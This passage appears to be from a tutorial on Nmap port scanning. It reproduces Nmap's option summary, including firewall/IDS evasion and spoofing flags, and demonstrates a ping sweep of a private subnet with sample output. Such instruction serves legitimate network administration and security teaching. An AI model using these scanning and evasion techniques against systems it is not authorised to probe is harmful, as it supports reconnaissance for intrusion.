  <span class="o">--</span><span class="n">excludefile</span> <span class="o">&lt;</span><span class="n">exclude_file</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Exclude</span> <span class="nb">list</span> <span class="kn">from</span> <span class="nn">file</span>
<span class="n">HOST</span> <span class="n">DISCOVERY</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sL</span><span class="p">:</span> <span class="n">List</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">simply</span> <span class="nb">list</span> <span class="n">targets</span> <span class="n">to</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">sn</span><span class="p">:</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">disable</span> <span class="n">port</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">Pn</span><span class="p">:</span> <span class="n">Treat</span> <span class="nb">all</span> <span class="n">hosts</span> <span class="k">as</span> <span class="n">online</span> <span class="o">--</span> <span class="n">skip</span> <span class="n">host</span> <span class="n">discovery</span>
  <span class="o">-</span><span class="n">PS</span><span class="o">/</span><span class="n">PA</span><span class="o">/</span><span class="n">PU</span><span class="o">/</span><span class="n">PY</span><span class="p">[</span><span class="n">portlist</span><span class="p">]:</span> <span class="n">TCP</span> <span class="n">SYN</span><span class="o">/</span><span class="n">ACK</span><span class="p">,</span> <span class="n">UDP</span> <span class="ow">or</span> <span class="n">SCTP</span> <span class="n">discovery</span> <span class="n">to</span> <span class="n">given</span> <span class="n">ports</span>
  <span class="o">-</span><span class="n">PE</span><span class="o">/</span><span class="n">PP</span><span class="o">/</span><span class="n">PM</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="ow">and</span> <span class="n">netmask</span> <span class="n">request</span> <span class="n">discovery</span> <span class="n">probes</span>
  <span class="o">-</span><span class="n">PO</span><span class="p">[</span><span class="n">protocol</span> <span class="nb">list</span><span class="p">]:</span> <span class="n">IP</span> <span class="n">Protocol</span> <span class="n">Ping</span>
  <span class="o">-</span><span class="n">n</span><span class="o">/-</span><span class="n">R</span><span class="p">:</span> <span class="n">Never</span> <span class="n">do</span> <span class="n">DNS</span> <span class="n">resolution</span><span class="o">/</span><span class="n">Always</span> <span class="n">resolve</span> <span class="p">[</span><span class="n">default</span><span class="p">:</span> <span class="n">sometimes</span><span class="p">]</span>
  <span class="o">--</span><span class="n">dns</span><span class="o">-</span><span class="n">servers</span> <span class="o">&lt;</span><span class="n">serv1</span><span class="p">[,</span><span class="n">serv2</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Specify</span> <span class="n">custom</span> <span class="n">DNS</span> <span class="n">servers</span>
  <span class="o">--</span><span class="n">system</span><span class="o">-</span><span class="n">dns</span><span class="p">:</span> <span class="n">Use</span> <span class="n">OS</span><span class="s1">&#39;s DNS resolver</span>
  <span class="o">--</span><span class="n">traceroute</span><span class="p">:</span> <span class="n">Trace</span> <span class="n">hop</span> <span class="n">path</span> <span class="n">to</span> <span class="n">each</span> <span class="n">host</span>
<span class="n">SCAN</span> <span class="n">TECHNIQUES</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sS</span><span class="o">/</span><span class="n">sT</span><span class="o">/</span><span class="n">sA</span><span class="o">/</span><span class="n">sW</span><span class="o">/</span><span class="n">sM</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">SYN</span><span class="o">/</span><span class="n">Connect</span><span class="p">()</span><span class="o">/</span><span class="n">ACK</span><span class="o">/</span><span class="n">Window</span><span class="o">/</span><span class="n">Maimon</span> <span class="n">scans</span>
  <span class="o">-</span><span class="n">sU</span><span class="p">:</span> <span class="n">UDP</span> <span class="n">Scan</span>
  <span class="o">-</span><span class="n">sN</span><span class="o">/</span><span class="n">sF</span><span class="o">/</span><span class="n">sX</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">Null</span><span class="p">,</span> <span class="n">FIN</span><span class="p">,</span> <span class="ow">and</span> <span class="n">Xmas</span> <span class="n">scans</span>
  <span class="o">--</span><span class="n">scanflags</span> <span class="o">&lt;</span><span class="n">flags</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Customize</span> <span class="n">TCP</span> <span class="n">scan</span> <span class="n">flags</span>
  <span class="o">-</span><span class="n">sI</span> <span class="o">&lt;</span><span class="n">zombie</span> <span class="n">host</span><span class="p">[:</span><span class="n">probeport</span><span class="p">]</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Idle</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">sY</span><span class="o">/</span><span class="n">sZ</span><span class="p">:</span> <span class="n">SCTP</span> <span class="n">INIT</span><span class="o">/</span><span class="n">COOKIE</span><span class="o">-</span><span class="n">ECHO</span> <span class="n">scans</span>
  <span class="o">-</span><span class="n">sO</span><span class="p">:</span> <span class="n">IP</span> <span class="n">protocol</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">FTP</span> <span class="n">relay</span> <span class="n">host</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">FTP</span> <span class="n">bounce</span> <span class="n">scan</span>
<span class="n">PORT</span> <span class="n">SPECIFICATION</span> <span class="n">AND</span> <span class="n">SCAN</span> <span class="n">ORDER</span><span class="p">:</span>
  <span class="o">-</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">port</span> <span class="n">ranges</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Only</span> <span class="n">scan</span> <span class="n">specified</span> <span class="n">ports</span>
    <span class="n">Ex</span><span class="p">:</span> <span class="o">-</span><span class="n">p22</span><span class="p">;</span> <span class="o">-</span><span class="n">p1</span><span class="o">-</span><span class="mi">65535</span><span class="p">;</span> <span class="o">-</span><span class="n">p</span> <span class="n">U</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="n">T</span><span class="p">:</span><span class="mi">21</span><span class="o">-</span><span class="mi">25</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">8080</span><span class="p">,</span><span class="n">S</span><span class="p">:</span><span class="mi">9</span>
  <span class="o">-</span><span class="n">F</span><span class="p">:</span> <span class="n">Fast</span> <span class="n">mode</span> <span class="o">-</span> <span class="n">Scan</span> <span class="n">fewer</span> <span class="n">ports</span> <span class="n">than</span> <span class="n">the</span> <span class="n">default</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">r</span><span class="p">:</span> <span class="n">Scan</span> <span class="n">ports</span> <span class="n">consecutively</span> <span class="o">-</span> <span class="n">don</span><span class="s1">&#39;t randomize</span>
  <span class="o">--</span><span class="n">top</span><span class="o">-</span><span class="n">ports</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Scan</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">most</span> <span class="n">common</span> <span class="n">ports</span>
  <span class="o">--</span><span class="n">port</span><span class="o">-</span><span class="n">ratio</span> <span class="o">&lt;</span><span class="n">ratio</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Scan</span> <span class="n">ports</span> <span class="n">more</span> <span class="n">common</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">ratio</span><span class="o">&gt;</span>
<span class="n">SERVICE</span><span class="o">/</span><span class="n">VERSION</span> <span class="n">DETECTION</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sV</span><span class="p">:</span> <span class="n">Probe</span> <span class="nb">open</span> <span class="n">ports</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span> <span class="n">info</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">intensity</span> <span class="o">&lt;</span><span class="n">level</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="kn">from</span> <span class="mi">0</span> <span class="p">(</span><span class="n">light</span><span class="p">)</span> <span class="n">to</span> <span class="mi">9</span> <span class="p">(</span><span class="k">try</span> <span class="nb">all</span> <span class="n">probes</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">light</span><span class="p">:</span> <span class="n">Limit</span> <span class="n">to</span> <span class="n">most</span> <span class="n">likely</span> <span class="n">probes</span> <span class="p">(</span><span class="n">intensity</span> <span class="mi">2</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="nb">all</span><span class="p">:</span> <span class="n">Try</span> <span class="n">every</span> <span class="n">single</span> <span class="n">probe</span> <span class="p">(</span><span class="n">intensity</span> <span class="mi">9</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="n">detailed</span> <span class="n">version</span> <span class="n">scan</span> <span class="n">activity</span> <span class="p">(</span><span class="k">for</span> <span class="n">debugging</span><span class="p">)</span>
<span class="n">SCRIPT</span> <span class="n">SCAN</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sC</span><span class="p">:</span> <span class="n">equivalent</span> <span class="n">to</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">default</span>
  <span class="o">--</span><span class="n">script</span><span class="o">=&lt;</span><span class="n">Lua</span> <span class="n">scripts</span><span class="o">&gt;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Lua</span> <span class="n">scripts</span><span class="o">&gt;</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">comma</span> <span class="n">separated</span> <span class="nb">list</span> <span class="n">of</span>
           <span class="n">directories</span><span class="p">,</span> <span class="n">script</span><span class="o">-</span><span class="n">files</span> <span class="ow">or</span> <span class="n">script</span><span class="o">-</span><span class="n">categories</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=&lt;</span><span class="n">n1</span><span class="o">=</span><span class="n">v1</span><span class="p">,[</span><span class="n">n2</span><span class="o">=</span><span class="n">v2</span><span class="p">,</span><span class="o">...</span><span class="p">]</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">provide</span> <span class="n">arguments</span> <span class="n">to</span> <span class="n">scripts</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="nb">all</span> <span class="n">data</span> <span class="n">sent</span> <span class="ow">and</span> <span class="n">received</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">updatedb</span><span class="p">:</span> <span class="n">Update</span> <span class="n">the</span> <span class="n">script</span> <span class="n">database</span><span class="o">.</span>
<span class="n">OS</span> <span class="n">DETECTION</span><span class="p">:</span>
  <span class="o">-</span><span class="n">O</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">OS</span> <span class="n">detection</span>
  <span class="o">--</span><span class="n">osscan</span><span class="o">-</span><span class="n">limit</span><span class="p">:</span> <span class="n">Limit</span> <span class="n">OS</span> <span class="n">detection</span> <span class="n">to</span> <span class="n">promising</span> <span class="n">targets</span>
  <span class="o">--</span><span class="n">osscan</span><span class="o">-</span><span class="n">guess</span><span class="p">:</span> <span class="n">Guess</span> <span class="n">OS</span> <span class="n">more</span> <span class="n">aggressively</span>
<span class="n">TIMING</span> <span class="n">AND</span> <span class="n">PERFORMANCE</span><span class="p">:</span>
  <span class="n">Options</span> <span class="n">which</span> <span class="n">take</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span> <span class="n">are</span> <span class="ow">in</span> <span class="n">seconds</span><span class="p">,</span> <span class="ow">or</span> <span class="n">append</span> <span class="s1">&#39;ms&#39;</span> <span class="p">(</span><span class="n">milliseconds</span><span class="p">),</span>
  <span class="s1">&#39;s&#39;</span> <span class="p">(</span><span class="n">seconds</span><span class="p">),</span> <span class="s1">&#39;m&#39;</span> <span class="p">(</span><span class="n">minutes</span><span class="p">),</span> <span class="ow">or</span> <span class="s1">&#39;h&#39;</span> <span class="p">(</span><span class="n">hours</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="n">value</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="mi">30</span><span class="n">m</span><span class="p">)</span><span class="o">.</span>
  <span class="o">-</span><span class="n">T</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">-</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="n">timing</span> <span class="n">template</span> <span class="p">(</span><span class="n">higher</span> <span class="ow">is</span> <span class="n">faster</span><span class="p">)</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">hostgroup</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">hostgroup</span> <span class="o">&lt;</span><span class="n">size</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Parallel</span> <span class="n">host</span> <span class="n">scan</span> <span class="n">group</span> <span class="n">sizes</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">parallelism</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">parallelism</span> <span class="o">&lt;</span><span class="n">numprobes</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Probe</span> <span class="n">parallelization</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span><span class="o">/</span><span class="n">initial</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Specifies</span>
      <span class="n">probe</span> <span class="nb">round</span> <span class="n">trip</span> <span class="n">time</span><span class="o">.</span>
  <span class="o">--</span><span class="nb">max</span><span class="o">-</span><span class="n">retries</span> <span class="o">&lt;</span><span class="n">tries</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Caps</span> <span class="n">number</span> <span class="n">of</span> <span class="n">port</span> <span class="n">scan</span> <span class="n">probe</span> <span class="n">retransmissions</span><span class="o">.</span>
  <span class="o">--</span><span class="n">host</span><span class="o">-</span><span class="n">timeout</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Give</span> <span class="n">up</span> <span class="n">on</span> <span class="n">target</span> <span class="n">after</span> <span class="n">this</span> <span class="n">long</span>
  <span class="o">--</span><span class="n">scan</span><span class="o">-</span><span class="n">delay</span><span class="o">/--</span><span class="nb">max</span><span class="o">-</span><span class="n">scan</span><span class="o">-</span><span class="n">delay</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Adjust</span> <span class="n">delay</span> <span class="n">between</span> <span class="n">probes</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="n">no</span> <span class="n">slower</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">per</span> <span class="n">second</span>
  <span class="o">--</span><span class="nb">max</span><span class="o">-</span><span class="n">rate</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="n">no</span> <span class="n">faster</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">per</span> <span class="n">second</span>
<span class="n">FIREWALL</span><span class="o">/</span><span class="n">IDS</span> <span class="n">EVASION</span> <span class="n">AND</span> <span class="n">SPOOFING</span><span class="p">:</span>
  <span class="o">-</span><span class="n">f</span><span class="p">;</span> <span class="o">--</span><span class="n">mtu</span> <span class="o">&lt;</span><span class="n">val</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">fragment</span> <span class="n">packets</span> <span class="p">(</span><span class="n">optionally</span> <span class="n">w</span><span class="o">/</span><span class="n">given</span> <span class="n">MTU</span><span class="p">)</span>
  <span class="o">-</span><span class="n">D</span> <span class="o">&lt;</span><span class="n">decoy1</span><span class="p">,</span><span class="n">decoy2</span><span class="p">[,</span><span class="n">ME</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Cloak</span> <span class="n">a</span> <span class="n">scan</span> <span class="k">with</span> <span class="n">decoys</span>
  <span class="o">-</span><span class="n">S</span> <span class="o">&lt;</span><span class="n">IP_Address</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Spoof</span> <span class="n">source</span> <span class="n">address</span>
  <span class="o">-</span><span class="n">e</span> <span class="o">&lt;</span><span class="n">iface</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Use</span> <span class="n">specified</span> <span class="n">interface</span>
  <span class="o">-</span><span class="n">g</span><span class="o">/--</span><span class="n">source</span><span class="o">-</span><span class="n">port</span> <span class="o">&lt;</span><span class="n">portnum</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Use</span> <span class="n">given</span> <span class="n">port</span> <span class="n">number</span>
  <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">length</span> <span class="o">&lt;</span><span class="n">num</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Append</span> <span class="n">random</span> <span class="n">data</span> <span class="n">to</span> <span class="n">sent</span> <span class="n">packets</span>
  <span class="o">--</span><span class="n">ip</span><span class="o">-</span><span class="n">options</span> <span class="o">&lt;</span><span class="n">options</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="k">with</span> <span class="n">specified</span> <span class="n">ip</span> <span class="n">options</span>
  <span class="o">--</span><span class="n">ttl</span> <span class="o">&lt;</span><span class="n">val</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="n">IP</span> <span class="n">time</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">live</span> <span class="n">field</span>
  <span class="o">--</span><span class="n">spoof</span><span class="o">-</span><span class="n">mac</span> <span class="o">&lt;</span><span class="n">mac</span> <span class="n">address</span><span class="o">/</span><span class="n">prefix</span><span class="o">/</span><span class="n">vendor</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Spoof</span> <span class="n">your</span> <span class="n">MAC</span> <span class="n">address</span>
  <span class="o">--</span><span class="n">badsum</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="k">with</span> <span class="n">a</span> <span class="n">bogus</span> <span class="n">TCP</span><span class="o">/</span><span class="n">UDP</span><span class="o">/</span><span class="n">SCTP</span> <span class="n">checksum</span>
<span class="n">OUTPUT</span><span class="p">:</span>
  <span class="o">-</span><span class="n">oN</span><span class="o">/-</span><span class="n">oX</span><span class="o">/-</span><span class="n">oS</span><span class="o">/-</span><span class="n">oG</span> <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Output</span> <span class="n">scan</span> <span class="ow">in</span> <span class="n">normal</span><span class="p">,</span> <span class="n">XML</span><span class="p">,</span> <span class="n">s</span><span class="o">|&lt;</span><span class="n">rIpt</span> <span class="n">kIddi3</span><span class="p">,</span>
     <span class="ow">and</span> <span class="n">Grepable</span> <span class="nb">format</span><span class="p">,</span> <span class="n">respectively</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">given</span> <span class="n">filename</span><span class="o">.</span>
  <span class="o">-</span><span class="n">oA</span> <span class="o">&lt;</span><span class="n">basename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Output</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">three</span> <span class="n">major</span> <span class="n">formats</span> <span class="n">at</span> <span class="n">once</span>
  <span class="o">-</span><span class="n">v</span><span class="p">:</span> <span class="n">Increase</span> <span class="n">verbosity</span> <span class="n">level</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">vv</span> <span class="ow">or</span> <span class="n">more</span> <span class="k">for</span> <span class="n">greater</span> <span class="n">effect</span><span class="p">)</span>
  <span class="o">-</span><span class="n">d</span><span class="p">:</span> <span class="n">Increase</span> <span class="n">debugging</span> <span class="n">level</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">dd</span> <span class="ow">or</span> <span class="n">more</span> <span class="k">for</span> <span class="n">greater</span> <span class="n">effect</span><span class="p">)</span>
  <span class="o">--</span><span class="n">reason</span><span class="p">:</span> <span class="n">Display</span> <span class="n">the</span> <span class="n">reason</span> <span class="n">a</span> <span class="n">port</span> <span class="ow">is</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">particular</span> <span class="n">state</span>
  <span class="o">--</span><span class="nb">open</span><span class="p">:</span> <span class="n">Only</span> <span class="n">show</span> <span class="nb">open</span> <span class="p">(</span><span class="ow">or</span> <span class="n">possibly</span> <span class="nb">open</span><span class="p">)</span> <span class="n">ports</span>
  <span class="o">--</span><span class="n">packet</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="nb">all</span> <span class="n">packets</span> <span class="n">sent</span> <span class="ow">and</span> <span class="n">received</span>
  <span class="o">--</span><span class="n">iflist</span><span class="p">:</span> <span class="n">Print</span> <span class="n">host</span> <span class="n">interfaces</span> <span class="ow">and</span> <span class="n">routes</span> <span class="p">(</span><span class="k">for</span> <span class="n">debugging</span><span class="p">)</span>
  <span class="o">--</span><span class="n">log</span><span class="o">-</span><span class="n">errors</span><span class="p">:</span> <span class="n">Log</span> <span class="n">errors</span><span class="o">/</span><span class="n">warnings</span> <span class="n">to</span> <span class="n">the</span> <span class="n">normal</span><span class="o">-</span><span class="nb">format</span> <span class="n">output</span> <span class="n">file</span>
  <span class="o">--</span><span class="n">append</span><span class="o">-</span><span class="n">output</span><span class="p">:</span> <span class="n">Append</span> <span class="n">to</span> <span class="n">rather</span> <span class="n">than</span> <span class="n">clobber</span> <span class="n">specified</span> <span class="n">output</span> <span class="n">files</span>
  <span class="o">--</span><span class="n">resume</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Resume</span> <span class="n">an</span> <span class="n">aborted</span> <span class="n">scan</span>
  <span class="o">--</span><span class="n">stylesheet</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">/</span><span class="n">URL</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">XSL</span> <span class="n">stylesheet</span> <span class="n">to</span> <span class="n">transform</span> <span class="n">XML</span> <span class="n">output</span> <span class="n">to</span> <span class="n">HTML</span>
  <span class="o">--</span><span class="n">webxml</span><span class="p">:</span> <span class="n">Reference</span> <span class="n">stylesheet</span> <span class="kn">from</span> <span class="nn">Nmap.Org</span> <span class="k">for</span> <span class="n">more</span> <span class="n">portable</span> <span class="n">XML</span>
  <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">stylesheet</span><span class="p">:</span> <span class="n">Prevent</span> <span class="n">associating</span> <span class="n">of</span> <span class="n">XSL</span> <span class="n">stylesheet</span> <span class="n">w</span><span class="o">/</span><span class="n">XML</span> <span class="n">output</span>
<span class="n">MISC</span><span class="p">:</span>
  <span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">IPv6</span> <span class="n">scanning</span>
  <span class="o">-</span><span class="n">A</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">OS</span> <span class="n">detection</span><span class="p">,</span> <span class="n">version</span> <span class="n">detection</span><span class="p">,</span> <span class="n">script</span> <span class="n">scanning</span><span class="p">,</span> <span class="ow">and</span> <span class="n">traceroute</span>
  <span class="o">--</span><span class="n">datadir</span> <span class="o">&lt;</span><span class="n">dirname</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Specify</span> <span class="n">custom</span> <span class="n">Nmap</span> <span class="n">data</span> <span class="n">file</span> <span class="n">location</span>
  <span class="o">--</span><span class="n">send</span><span class="o">-</span><span class="n">eth</span><span class="o">/--</span><span class="n">send</span><span class="o">-</span><span class="n">ip</span><span class="p">:</span> <span class="n">Send</span> <span class="n">using</span> <span class="n">raw</span> <span class="n">ethernet</span> <span class="n">frames</span> <span class="ow">or</span> <span class="n">IP</span> <span class="n">packets</span>
  <span class="o">--</span><span class="n">privileged</span><span class="p">:</span> <span class="n">Assume</span> <span class="n">that</span> <span class="n">the</span> <span class="n">user</span> <span class="ow">is</span> <span class="n">fully</span> <span class="n">privileged</span>
  <span class="o">--</span><span class="n">unprivileged</span><span class="p">:</span> <span class="n">Assume</span> <span class="n">the</span> <span class="n">user</span> <span class="n">lacks</span> <span class="n">raw</span> <span class="n">socket</span> <span class="n">privileges</span>
  <span class="o">-</span><span class="n">V</span><span class="p">:</span> <span class="n">Print</span> <span class="n">version</span> <span class="n">number</span>
  <span class="o">-</span><span class="n">h</span><span class="p">:</span> <span class="n">Print</span> <span class="n">this</span> <span class="n">help</span> <span class="n">summary</span> <span class="n">page</span><span class="o">.</span>
<span class="n">EXAMPLES</span><span class="p">:</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">A</span> <span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">sn</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">16</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">8</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">iR</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span>
<span class="n">SEE</span> <span class="n">THE</span> <span class="n">MAN</span> <span class="n">PAGE</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">book</span><span class="o">/</span><span class="n">man</span><span class="o">.</span><span class="n">html</span><span class="p">)</span> <span class="n">FOR</span> <span class="n">MORE</span> <span class="n">OPTIONS</span> <span class="n">AND</span> <span class="n">EXAMPLES</span>
</pre></div>
</div>
<p>Nmap has dozens of options available. Since this section is dealing with
port scanning, we will focus on the commands required to perform this
task. It is important to note that the commands utilized depend mainly
on the time and number of hosts being scanned. The more hosts or less
time that you have to perform this tasks, the less that we will
interrogate the host. This will become evident as we continue to discuss
the options.</p>
<div class="line-block">
<div class="line">To perform a ping sweep you would want to utilize the following
command:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sn</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;/&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">CIDR</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="ow">or</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">Mask</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sn</span> <span class="mf">10.25</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">24</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">58</span> <span class="n">Eastern</span> <span class="n">Daylight</span> <span class="n">Time</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.25</span><span class="o">.</span><span class="mf">0.1</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.0030</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">MAC</span> <span class="n">Address</span><span class="p">:</span> <span class="n">C0</span><span class="p">:</span><span class="n">C1</span><span class="p">:</span><span class="n">C0</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">5</span><span class="n">C</span><span class="p">:</span><span class="mi">16</span> <span class="p">(</span><span class="n">Unknown</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.25</span><span class="o">.</span><span class="mf">0.111</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.013</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
